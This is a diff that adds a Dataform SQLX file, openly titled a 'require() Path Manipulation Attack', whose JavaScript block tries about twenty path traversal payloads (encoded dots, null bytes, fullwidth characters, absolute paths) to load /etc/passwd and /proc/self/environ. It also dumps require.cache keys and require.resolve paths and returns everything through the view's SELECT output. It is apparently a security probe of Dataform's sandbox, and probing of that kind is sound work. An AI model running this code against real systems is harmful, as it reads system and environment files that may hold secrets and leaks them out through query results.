@@ -1,0 +1,104 @@
+-- require() Path Manipulation Attack
+-- Tests if Dataform's custom require() has path traversal vulnerabilities
+
+config {
+  type: "view",
+  name: "require_path_attack"
+}
+
+js {
+  let results = [];
+
+  // Various path traversal attempts for require()
+  const paths = [
+    // Basic traversal
+    "./definitions/../../../etc/passwd",
+    "../../../etc/passwd",
+    "..\\..\\..\\etc\\passwd",
+
+    // Null byte injection (may terminate string early)
+    "./definitions/\u0000/../../../etc/passwd",
+    "valid\u0000/../../../etc/passwd",
+
+    // URL encoding
+    "./definitions/..%2F..%2F..%2Fetc%2Fpasswd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+
+    // Double encoding
+    "./definitions/..%252F..%252F..%252Fetc%252Fpasswd",
+
+    // Unicode normalization attacks
+    "./definitions/\u002e\u002e/\u002e\u002e/etc/passwd",  // Unicode dots
+    "./definitions/．．/．．/etc/passwd",  // Fullwidth dots
+
+    // Mixed slashes
+    "./definitions/../../../etc\\passwd",
+    "./definitions/..\\..\\..\\etc/passwd",
+
+    // Extra slashes
+    "./definitions//..//..//..//etc//passwd",
+    "./definitions/.../.../.../etc/passwd",
+
+    // Case variations (unlikely to work on Linux)
+    "./definitions/../../../ETC/PASSWD",
+
+    // Symlink-like patterns
+    "./definitions/./../.././../../etc/passwd",
+
+    // Absolute paths
+    "/etc/passwd",
+    "/proc/self/environ",
+    "file:///etc/passwd",
+
+    // Node modules path hijack
+    "../../../../etc/passwd",
+    "../node_modules/../../../../etc/passwd"
+  ];
+
+  for (const p of paths) {
+    try {
+      const mod = require(p);
+      results.push("REQUIRE_SUCCESS: " + p.substring(0, 40) + " = " + String(mod).substring(0, 100));
+    } catch(e) {
+      // Check if error message leaks any useful info
+      const errMsg = e.message || String(e);
+      if (errMsg.includes('/') || errMsg.includes('\\')) {
+        results.push("REQUIRE_PATH_LEAK: " + p.substring(0, 30) + " -> " + errMsg.substring(0, 100));
+      } else {
+        results.push("REQUIRE_FAIL: " + p.substring(0, 30) + " - " + errMsg.substring(0, 60));
+      }
+    }
+  }
+
+  // Try to read what require.cache contains
+  results.push("=== require.cache analysis ===");
+  try {
+    if (typeof require.cache === 'object') {
+      const cacheKeys = Object.keys(require.cache);
+      results.push("CACHE_KEYS: " + cacheKeys.slice(0, 10).join(', '));
+      for (const key of cacheKeys.slice(0, 5)) {
+        results.push("CACHE_" + key.substring(key.lastIndexOf('/') + 1) + ": " + typeof require.cache[key]);
+      }
+    }
+  } catch(e) {
+    results.push("CACHE_ERROR: " + e.message);
+  }
+
+  // Try require.resolve to see path resolution
+  results.push("=== require.resolve analysis ===");
+  const resolvePaths = [
+    "@dataform/core",
+    "../../../etc/passwd",
+    "/etc/passwd"
+  ];
+  for (const p of resolvePaths) {
+    try {
+      const resolved = require.resolve ? require.resolve(p) : "no resolve";
+      results.push("RESOLVE: " + p + " -> " + resolved);
+    } catch(e) {
+      results.push("RESOLVE_FAIL: " + p + " - " + e.message.substring(0, 50));
+    }
+  }
+}
+
+SELECT '${JSON.stringify(results)}' as require_results
